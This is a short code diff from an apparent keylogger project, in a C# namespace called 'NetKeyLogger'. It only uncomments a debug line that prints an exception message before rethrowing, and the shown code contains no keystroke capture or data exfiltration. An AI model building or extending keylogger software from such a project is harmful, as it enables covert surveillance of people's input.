@@ -403,7 +403,7 @@ namespace NetKeyLogger
             catch (Exception ex)
             {
                 // Uncomment this to help debug.
-                // Console.WriteLine(ex.Message);
+                 Console.WriteLine(ex.Message);
                 throw;
             }
         }
